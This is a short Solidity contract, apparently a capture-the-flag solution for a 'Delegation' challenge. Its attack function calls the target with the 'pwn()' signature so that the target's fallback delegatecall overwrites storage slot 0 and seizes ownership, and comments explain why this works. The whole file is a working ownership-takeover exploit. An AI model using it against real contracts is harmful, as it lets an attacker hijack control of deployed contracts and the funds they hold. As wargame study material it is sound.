// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract DelegationAttack is Broadcasted {
    function attack(address payable delegationCtr_) public payable override {
        delegationCtr_.call(_getSignature());
    }

    function _getSignature() private pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }
}

// ! Delegate and Delegation contracts have owner on the pos 0 of the storage
// ! by calling pwn() in Delegation will call the function in Delegate and change
// ! the owner of the contract in the sender contract (Delegation) thats how delegate-call works
